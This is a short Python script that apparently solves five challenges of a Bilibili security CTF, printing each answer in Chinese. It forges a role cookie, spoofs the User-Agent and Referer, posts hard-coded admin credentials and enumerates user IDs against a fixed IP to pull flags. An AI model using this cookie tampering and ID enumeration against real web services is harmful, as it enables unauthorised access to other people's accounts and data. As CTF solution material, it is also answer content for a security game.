import requests
import json


def get_1():
    headers = {
        'User-Agent': 'bilibili Security Browser',
        'Cookie': 'session =  ' + session + ';role=ee11cbb19052e40b07aac0ca060c23ee'
    }
    response = requests.get('http://45.113.201.36/api/admin', headers=headers).json()
    print('第1题答案是:', response['data'])


def get_2():
    headers = {
        'User-Agent': 'bilibili Security Browser',
        'Cookie': 'session = ' + session + ';role=ee11cbb19052e40b07aac0ca060c23ee'
    }
    response = requests.get('http://45.113.201.36/api/ctf/2', headers=headers).json()
    print('第2题答案是:', response['data'])


def get_3():
    headers = {
        'User-Agent': 'bilibili Security Browser',
        'Cookie': 'session=' + session + '; role=ee11cbb19052e40b07aac0ca060c23ee',
        'Content-Type': 'application/json'
    }
    data = {
        "username": "admin",
        "passwd": "bilibili"
    }
    response = requests.post('http://45.113.201.36/api/ctf/3', headers=headers, data=json.dumps(data)).json()
    print('第3题答案是:', response['data'])


def get_4():
    headers = {
        'User-Agent': 'bilibili Security Browser',
        'Cookie': 'session = ' + session + ';role=7b7bc2512ee1fedcd76bdc68926d4f7b'
    }
    response = requests.get('http://45.113.201.36/api/ctf/4', headers=headers).json()
    print('第4题答案是:', response['data'])


def get_5():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
        'Cookie': 'session=' + session + '; role=ee11cbb19052e40b07aac0ca060c23ee',
        'Referer': 'http://45.113.201.36/user.html'
    }
    for i in range(100336850, 100336980):
        response = requests.get('http://45.113.201.36/api/ctf/5?uid=' + str(i), headers=headers).json()  # 100336973
        if response['data'] != '':
            print('第5题答案是:', response['data'])


if __name__ == '__main__':
    session = input('填入你的session:')
    get_1()
    get_2()
    get_3()
    get_4()
    get_5()
